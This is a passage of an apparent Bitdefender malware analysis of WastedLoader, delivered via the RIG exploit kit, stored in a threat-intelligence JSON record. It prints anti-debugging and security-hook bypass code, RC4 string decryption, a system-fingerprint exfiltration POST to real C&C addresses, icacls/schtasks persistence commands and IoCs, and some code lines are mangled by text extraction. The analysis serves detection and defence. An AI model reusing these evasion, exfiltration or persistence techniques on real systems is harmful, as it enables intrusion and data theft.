aExitProcess);\n\n##### Anti-debugging\n\nAn interesting code-flow obfuscation and anti-debugging trick relies on DebugBreak exceptions (int 3). For example:\n\npush  aCreateEventA\npush  aKERNEL32_DLL\ncall  resolve_function\ntest  eax, eax         ; eax=CreateEventA\njz   loc_40CEEA\nxor   edx, edx         ; edx=0\npush  edx\npush  edx\npush  1\npush  edx\nint   3             ; <-- DebugBreak\nretn               ; return to 0\n\nWhen a debugger is attached, it will break on the exception, and if we choose to continue execution, a crash will occur,\nbecause retn will jump to the value of edx which is 0.\n\nThis is because the malware registers beforehand a Vectored Exception Handler that handles these DebugBreak exceptions and executes something else instead:\n\nint __stdcall VectoredExceptionHandler(_EXCEPTION_POINTERS *exc)\n{\nexc_code = exc->ExceptionRecord->ExceptionCode;\n...\n_// DebugBreak handling_\n**if (exc_code == EXCEPTION_BREAKPOINT)**\n{\n_// set continuation at next instruction (RET)_\n++exc->ContextRecord->Eip;\n_// push address after RET to stack_\nexc->ContextRecord->Esp -= 4;\n*(_DWORD *)exc->ContextRecord->Esp = exc->ContextRecord->Eip + 1;\n_// push EAX on stack_\nexc >ContextRecord >Esp = 4;\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n_// continue execution (at RET)_\n**return EXCEPTION_CONTINUE_EXECUTION;**\n}\n}\n\nSo if a DebugBreak exception is encountered, the exception handler changes execution to do the following:\n\npush after_ret\npush eax\nret\n\nwhich is equivalent to a call eax. So the original code becomes:\n\npush  aCreateEventA\npush  aKERNEL32_DLL\ncall  resolve_function\ntest  eax, eax         ; eax=CreateEventA\njz   loc_40CEEA\nxor   edx, edx         ; edx=0\npush  edx\npush  edx\npush  1\npush  edx\ncall  eax            ; call eax (CreateEventA)\n\nWe can replace these int 3, retn sequences with call eax in the disassembler, using our Python IDA Plugin’s\nevan_ana_insn callback:\n\n**def ev_ana_insn(self, insn):**\na = insn.ea\nb = bytes(idaapi.get_bytes(a, 30))\n\n_# int 3, ret => call eax_\n**if b[0:2] == b’\\xCC\\xC3’:**\nprint(‘### <!> int 3: %x’ % a)\nidaapi.put_word(a, 0xD0FF)\n\n##### Anti-hooking\n\nIf certain security modules are loaded, the malware checks for inline function hooks and attempts to bypass them.\n\nTo identify the security modules while avoiding comparing strings, the malware uses name hashes. If certain hashes\nare encountered, specific hook bypassing operations are performed, targeted against the respective security solutions.\n\nIf the loaded module CRC32 name hash is 4DE0FF8B, the ntdll’s NtQueueApcThread function is checked if hooked\n(has a JMP first instruction). If so, a bypassing patch is applied to the hooking code, by searching for all occurrences of\n(XX is wildcard):\n\n83 78 xx 00     cmp dword [eax+XX], 0\n75 xx        jne $+XX\nf0 ...       lock ...\n\nThe conditional jump is patched with two NOPs (9090), so the jump is never taken:\n\n83 78 3f 00     cmp dword [eax+XX], 0\n90         nop\n90         nop\nf0 ...       lock ...\n\nIf another security module is loaded (CRC32 on DLL name is 5c6bbd94), a hook bypassing patch is applied on this\ncode found in its .text section:\n\n33 c0        xor al, al\n7 00000000 d d 0\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n84 c0        test al, al\n0f 85 xxxxxxxx   jnz XX\n\nThe test instruction is replaced with another instruction making al non-zero, so the jump is always taken:\n\n33 c0        xor al, al\nc7 xx xx 00000000  mov dword [reg+XX], 0\n0c 01        or al, 1\n0f 85 xxxxxxxx   jnz XX\n\nIf another security module is loaded (CRC32 on DLL name is be718db1), a couple of hook bypassing patches are\napplied on code found in its .text section. First one:\n\n8b 00      mov  eax, dword [eax]\nff 70 xx    push  dword [eax+XX]\nff 30      push  dword [eax]\n51       push  ecx\nff 37      push  dword [edi]\n8b 0e      mov  ecx, dword [esi]\n\nThe last push value is replaced with 0:\n\n8b 00      mov  eax, dword [eax]\nff 70 xx    push  dword [eax+XX]\nff 30      push  dword [eax]\n51       push  ecx\n6a 00      push  0\n8b 0e      mov  ecx, dword [esi]\n\nThe second pattern searched for this module is:\n\n6a 00      push  0\n6a 00      push  0\n6a 03      push  3\n89 xx      mov  dword [reg], reg\n\nThis one is patched so that the last push value is 16h:\n\n6a 00      push  0\n6a 00      push  0\n6a 16      push  16h\n89 xx      mov  dword [reg], reg\n\nFinally, if one of these critical functions is hooked (starts with JMP):\n\n - NtProtectVirtualMemory\n\n - NtWriteVirtualMemory\n\n - NtQueueApcThread\n\n - NtTerminateProcess\n\nthen the malware may attempt to bypass hooking by restoring the original opcodes from the ntdll.dll file from disk.\n\n##### Strings encryption\n\nUsed strings are stored in encrypted form in the third stage .rdata section, and decrypted at runtime using the RC4\nalgorithm with fixed 320-bit keys. We can recognize the RC4 key scheduling in the processing function:\n\n_// RC4 key scheduling, first loop_\n\n**f** (i 0 i < 0 100 ++i)\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\nkey_value = key[i % key_len];\nS[i] = i;\nkey_values[i] = key_value;\n}\n_// RC4 key scheduling, second loop_\nJ = 0;\n**for (h = 0; h < 0x80; ++h)**\n{\n_// i=2*h_\nS_i = S[2*h];\nj = (J + S_2h + key_values[2*h]) & 0xFF;\n_// swap S[i] and S[j]_\nS[2*h] = S[j];\nS[j] = S_i;\n\n_// i=2*h+1_\nS_I = S[2*h+1];\nJ = (j + S_I + key_values[2*h+1]) & 0xFF;\n_// swap S[i] and S[j]_\nS[2*h+1] = S[J];\nS[J] = S_I;\n}\n\nIn each encrypted block we find multiple strings chained together, separated by null terminators. The target string is\nretrieved by its index in the chain, at decryption time, by a transform callback that skips the first N strings.\n\nThis is the decryption loop using the transform callback:\n\n**do {**\ncopy_of_S_prng_i = S[prng_i];\nprng_j = (copy_of_S_prng_i + prng_j) & 0xFF;\nS[prng_i] = S[prng_j];\nS[prng_j] = copy_of_S_prng_i;\nsum_mod_256 = (S[prng_i] + copy_of_S_prng_i) & 0xFF;\nwork_byte = a3_in[input_index];\n**if ( v27 )**\n_// plaintext xor K_\nwork_byte ^= S[sum_mod_256];\n**if ( a6_transform )**\n{\nv26 = input_index;\n_// apply provided callback (skip first N strings)_\nstop = a6_transform(work_byte, decrypt_struct);\ninput_index = v26;\n**if ( stop )**\n**return;**\n}\n**else**\n{\na5_out[input_index] = work_byte;\n}\n++input_index;\n++prng_i;\n}\n**while ( input_index < a4_in_len );**\n\nSeparate string structures are created on the same buffer, with different offsets and lengths, depending on string\nposition in the chain:\n\n**struct encrypted_string**\n{\nint len;\nint padded_len;\nchar *buffer;\n\nint buffer offset;\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n##### Network activity\n**_System fingerprint_**\n\nBefore sending requests, the malware computes a system fingerprint, consisting of an MD5 hash on the following\ninformation:\n\n- computer name\n\n- user name\n\n- install date from HKLM\\Software\\Microsoft\\Windows NT\\”InstallDate”\n\nThe system fingerprint, together with a list of installed programs, versions and environment variables, are sent over to\nthe malware C&C server:\n\n<computer_name>_<fingerprint_hash>\n\n<program name 1> <version>\n<program name 2> <version>\n...all other installed programs...\n\ncomputername=<computer_name>\nos=<os_name>\npath=<system_path>\nprocessor_architecture=<proc_arch>\nprocessor_identifier=<proc_name>\nuserdomain=<domain>\nusername=<user_name>\nuserprofile=<user_profile_dir>\nsystemroot=<windows_dir>\n...all other environment variables...\n\nThis information is encrypted using the RC4 algorithm mentioned before, using a fixed 312-bit key, stored encrypted in\nthe .rdata section. The key is:\n\n“0b5OfJrLOaYVR1bowGFadUUE3wXdLGZLGKutwX7”\n\n##### C&C requests\n\nAfter it has been encrypted, the system information is sent to the C&C server as a HTTPS POST request that includes:\n\nPOST https://157.7.166.26:5353/ HTTP/1.1\nCache-Control: no-cache\nHost: 157.7.166.26:5353\nContent-Length: <length>\nConnection: Close\n\n<encrypted system information>\n<crc32 on encrypted data>\n<md5 on fingerprint hash>\n<request code>\n\nThe malware tries several C&C hosts in order, connecting to the first one that is up:\n\n- host 157.7.166.26 on port 5353\n\n- host 162.144.127.197 on port 3786\n\n- host 46.22.57.17 on port 5037\n\nThe request code is a value that determines the requested operation. It can have one of the following values, but\ntheir meaning is not totally clear:\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n\n\n- first request has code: 18F8C844, needs non-null response\n\n- second request has code: 11041F01, needs more than 128 byte response\n\n- third request has code: D3EF7577, doesn’t need response\n\n- fourth request has code: 69BE7CEE, doesn’t need response\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n### WastedLoader fourth stage\n\nIt is possible that the 11041F01 request, which requires a large response from the C&C server, would download the\nfourth stage, but there was no successful server reply in our tests.\n\nIn our tests, the first C&C IP (157.7.166.26) always replied 403 Forbidden, while the other two IPs did not\nrespond.\n\n##### Persistence\n\nIf a fourth stage is downloaded from the C&C server, it will be set to run every 30 minutes by using the Windows\nTask Scheduler. A task with random name is created (for example Npneehvgfivrccw) in the same directory as other\nmaintenance tasks like:\n\n  - Windows Error Reporting\n\n  - Time Synchronization\n\n  - Customer Experience Improvement Program\n\n  - other folders found in <SystemDir>\\Tasks\n\nThe task command is executing the downloaded payload:\n\n**<Actions Context=”Author”>**\n**<Exec>**\n**<Command>C:\\Windows\\system32\\GYfSOumNR\\</Command>**\n**</Exec>**\n**</Actions>**\n\nBecause modifying files inside the <SystemDir>\\Tasks folder is not permitted even for administrators, the icacls.\nexe tool is executed, to grant the required permissions:\n\nC:\\Windows\\system32\\icacls.exe “C:\\Windows\\system32\\Tasks\\Microsoft\\Windows\\Windows\nError Reporting\\QueueReporting-S-1-5-21-3156518309-996909167-609108344-1000” /grant:r\n“COMPUTER\\User”:F\n\nThen the task is scheduled using the schtasks.exe tool:\n\nC:\\Windows\\system32\\schtasks.exe /run /tn “Microsoft\\Windows\\Windows Error Reporting\\\nQueueReporting-S-1-5-21-3156518309-996909167-609108344-1000”\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n## References\n\n- CVE-2019-0752, Scripting Engine Memory Corruption Vulnerability\nMicrosoft – Apr 9, 2019\nhttps://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-0752\n\n- CVE-2019-0752, RCE Without Native Code: Exploitation of a Write-What-Where in Internet Explorer\nSimon Zuckerbraun – May 21, 2019\nhttps://www.zerodayinitiative.com/blog/2019/5/21/rce-without-native-code-exploitation-of-a-write-what-where-ininternet-explorer\n\n- CVE-2018-8174 Metasploit module\n0x09AL – May 23, 2018\nhttps://github.com/0x09AL/CVE-2018-8174-msf#cve-2018-8174-msf\n\n- CVE-2018-8174, Windows VBScript Engine Remote Code Execution Vulnerability\nMicrosoft – May 8, 2018\nhttps://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2018-8174\n\n- CVE-2018-8174, The King is dead. Long live the King!\nVladislav Stolyarov – May 9, 2018\nhttps://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/\n\n- CVE-2018-8174, Dissecting modern browser exploit: case study\nPiotr Florczyk – Jul 10, 2018\nhttps://github.com/piotrflorczyk/cve-2018-8174_analysis\n\n- Threat Bulletin: WastedLocker Ransomware\nVMRay – August 20, 2020\nhttps://www.vmray.com/cyber-security-blog/wastedlocker-ransomware-threat-bulletin/\n\n- WastedLocker: A New Ransomware Variant Developed By The Evil Corp Group\nStefano Antenucci – June 23, 2020\nhttps://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corpgroup/\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n## Indicators of compromise\n\nVBScript exploits:\n\n - 5e341da684a504b7328243d5c9c0f09a (CVE-2019-0752)\n\n - ff68100339c8075243ccf391c179173b (CVE-2018-8174)\n\nWastedLoader executables:\n\n - 6afc5c3e1caa344989513b2773ae172a\n\n - 3c4e86b0d42094f25d4c34ca882e5c09\n\n - 6ee2138d5467da398e02afe2baea9fbe\n\nRIG EK redirecting hosts:\n\n - traffic.allindelivery.net – 188.127.249.141\n\n - myallexit.xyz – 188.225.75.54\n\n - clickadusweep.vip – 188.225.75.54\n\n - enter.testclicktds.xyz – 185.230.140.204\n\n - zeroexit.xyz – 188.225.75.54\n\n - zero.testtrack.xyz – 185.230.140.204\n\nRIG EK landing page hosts:\n\n - 45.138.24.35\n\n - 188.227.106.122\n\n - 188.227.57.214\n\nWastedLoader C&C hosts:\n\n - 157.7.166.26 on port 5353\n\n - 162.144.127.197 on port 3786\n\n - 46.22.57.17 on port 5037\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n\n-----\n\n##### Proudly Serving Our Customers Dedicated To Our +20.000 Worldwide Partners\nBitdefender provides solutions and services for small business and medium A channel-exclusive vendor, Bitdefender is proud to share success with tens of\nenterprises, service providers and technology integrators. We take pride in thousands of resellers and distributors worldwide.\nthe trust that enterprises such as Mentor, Honeywell, Yamaha, Speedway,\n**Esurance or Safe Systems place in us.** _CRN 5-Star Partner, 4th Year in a Row. Recognized on CRN’s Security 100 List. CRN Cloud_\n\n_Partner, 2nd year in a Row_\n\n_Leader in Forrester’s inaugural Wave™ for Cloud Workload Security_\n\n_More MSP-integrated solutions than any other security vendor_\n\n_NSS Labs “Recommended” Rating in the NSS Labs AEP Group Test_\n\n_3 Bitdefender Partner Programs - to enable all our partners – resellers, service providers_\n\n_SC Media Industry Innovator Award for Hypervisor Introspection, 2nd Year in_ _and hybrid partners – to focus on selling Bitdefender solutions that match their own_\n_a Row_ _specializations_\n\n_Gartner® Representative Vendor of Cloud-Workload Protection Platforms_\n\n##### Trusted Security Authority\nBitdefender is a proud technology alliance partner to major virtualization vendors, directly contributing to the development of secure ecosystems with VMware,\n**Nutanix, Citrix, Linux Foundation, Microsoft, AWS, and Pivotal.**\n\nThrough its leading forensics team, Bitdefender is also actively engaged in countering international cybercrime together with major law enforcement agencies\nsuch as FBI and Europol, in initiatives such as NoMoreRansom and TechAccord, as well as the takedown of black markets such as Hansa. Starting in 2019,\nBitdefender is also a proudly appointed CVE Numbering Authority in MITRE Partnership.\n\n**RECOGNIZED BY LEADING ANALYSTS AND INDEPENDENT TESTING ORGANIZATIONS** **TECHNOLOGY ALLIANCES**\n\n##### UNDER THE SIGN OF THE WOLF\n\n**Founded 2001, Romania** A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can\n**Number of employees 1800+** win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand,\n\nand one million times out of one million.\n\n**Headquarters**\nEnterprise HQ – Santa Clara, CA, United States And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight,\nTechnology HQ – Bucharest, Romania but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our\n\ncollective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against\n\n**WORLDWIDE OFFICES** all dangers hidden in the arcane intricacies of the digital realm.\n**USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX |**\nToronto, CA This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.\n**Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY |**\nMilan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona, SPAIN\n| Dubai, UAE | London, UK | Hague, NETHERLANDS\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.bitdefender.com/files/News/CaseStudies/study/397/Bitdefender-PR-Whitepaper-RIG-creat5362-en-EN.pdf"
    ],
    "report_names": [
        "Bitdefender-PR-Whitepaper-RIG-creat5362-en-EN.pdf"
    ],
    "threat_actors": [
        {
            "id": "6c4f98b3-fe14-42d6-beaa-866395455e52",
            "created_at": "2023-01-06T13:46:39.169554Z",
            "updated_at": "2025-03-27T02:00:03.011739Z",
            "deleted_at": null,
            "main_name": "Evil Corp",
            "aliases": [
                "GOLD DRAKE"
            ],
            "source_name": "MISPGALAXY:Evil Corp",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2864e40a-f233-4618-ac61-b03760a41cbb",
            "created_at": "2023-12-01T02:02:34.272108Z",
            "updated_at": "2025-03-27T02:02:10.209072Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "ETDA:WildCard",
            "tools": [
                "RustDown",
                "SysJoker"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "50068c14-343c-4491-b568-df41dd59551c",
            "created_at": "2022-10-25T15:50:23.253218Z",
            "updated_at": "2025-03-27T02:00:55.408128Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Indrik Spider",
                "Evil Corp",
                "Manatee Tempest",
                "DEV-0243",
                "UNC2165"
            ],
            "source_name": "MITRE:Indrik Spider",
            "tools": [
                "Mimikatz",
                "PsExec",
                "Dridex",
                "WastedLocker",
                "BitPaymer",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9806f226-935f-48eb-b138-6616c9bb9d69",
            "created_at": "2022-10-25T16:07:23.73153Z",
            "updated_at": "2025-03-27T02:02:09.950784Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Blue Lelantos",
                "DEV-0243",
                "Evil Corp",
                "Gold Drake",
                "Gold Winter",
                "Manatee Tempest",
                "UNC2165"
            ],
            "source_name": "ETDA:Indrik Spider",
            "tools": [
                "Advanced Port Scanner",
                "Agentemis",
                "Babuk",
                "Babuk Locker",
                "Babyk",
                "BitPaymer",
                "Bugat",
                "Bugat v5",
                "Cobalt Strike",
                "CobaltStrike",
                "Cridex",
                "Dridex",
                "EmPyre",
                "EmpireProject",
                "FAKEUPDATES",
                "FakeUpdate",
                "Feodo",
                "FriedEx",
                "Hades",
                "IEncrypt",
                "LINK_MSIEXEC",
                "MEGAsync",
                "Macaw Locker",
                "Metasploit",
                "Mimikatz",
                "PayloadBIN",
                "Phoenix Locker",
                "PowerShell Empire",
                "PowerSploit",
                "PsExec",
                "QNAP-Worm",
                "Raspberry Robin",
                "RaspberryRobin",
                "SocGholish",
                "Vasa Locker",
                "WastedLoader",
                "WastedLocker",
                "cobeacon",
                "wp_encrypt"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b296f34c-c424-41da-98bf-90312a5df8ef",
            "created_at": "2024-06-19T02:03:08.027585Z",
            "updated_at": "2025-03-27T02:05:17.350153Z",
            "deleted_at": null,
            "main_name": "GOLD DRAKE",
            "aliases": [
                "Indrik Spider ",
                "Evil Corp"
            ],
            "source_name": "Secureworks:GOLD DRAKE",
            "tools": [
                " Cobalt Strike",
                " Covenant",
                " Donut",
                " Dridex",
                " Hades",
                " Koadic",
                " LockBit",
                " Macaw Locker",
                " Mimikatz",
                " Payload.Bin",
                " Phoenix CryptoLocker",
                " PowerSploit",
                " Powershell Empire",
                " SocGholish",
                " WastedLocker",
                "BitPaymer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "256a6a2d-e8a2-4497-b399-628a7fad4b3e",
            "created_at": "2023-11-30T02:00:07.299845Z",
            "updated_at": "2025-03-27T02:00:03.257794Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "MISPGALAXY:WildCard",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041799,
    "ts_creation_date": 1619117086,
    "ts_modification_date": 1619117090,
    "files": {
        "pdf": "https://archive.orkl.eu/01893a899e8f8b1599c502f7578c30c82bf19cbf.pdf",
        "text": "https://archive.orkl.eu/01893a899e8f8b1599c502f7578c30c82bf19cbf.txt",
        "img": "https://archive.orkl.eu/01893a899e8f8b1599c502f7578c30c82bf19cbf.jpg"
    }
}